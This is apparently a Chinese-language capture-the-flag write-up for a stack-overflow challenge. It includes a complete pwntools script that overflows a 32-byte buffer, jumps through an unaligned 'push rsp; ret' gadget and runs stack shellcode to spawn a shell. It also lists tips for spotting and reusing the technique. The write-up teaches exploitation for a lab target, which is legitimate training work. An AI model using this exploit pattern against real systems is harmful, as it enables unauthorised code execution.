# Blast From The Past

## 题目简述

64 位 ELF 在栈上的 32 字节缓冲区中使用 `scanf("%320s", retro_cat)`，造成直接栈溢出。二进制没有 PIE，栈段为 RWE，也没有栈 Canary，因此可把 shellcode 放在栈上，再把返回地址改为跳向当前栈指针的 gadget。

## 解题过程

从缓冲区起点到保存的返回地址偏移为 56 字节。二进制地址 `0x4011fc` 虽位于另一条指令的立即数中间，但从该字节开始反汇编得到：

```asm
push rsp
ret
```

`push rsp; ret` 等价于把控制流转到 gadget 执行时的栈顶。返回地址之后紧跟 shellcode，因此 payload 为：

```python
from pwn import ELF, asm, context, flat, process, shellcraft

context.binary = ELF("./challenge")
io = process("./challenge")

payload = flat(
    b"A" * 56,
    0x4011FC,
    asm(shellcraft.sh()),
)

io.sendlineafter(b"dude:", payload)
io.interactive()
```

取得 shell 后读取 `flag.txt`：

```text
grey{traditional_ret2shellcode_exploits!}
```

## 方法总结

- 核心技巧：栈溢出覆盖返回地址，利用固定地址的 `push rsp; ret` 跳入紧随其后的栈上 shellcode。
- 识别信号：过大的 `%s` 宽度、无 Canary、无 PIE、可执行栈。
- 复用要点：gadget 可能从现有指令中间非对齐开始；使用前要按精确地址反汇编，并确认 NX/栈权限允许执行 shellcode。
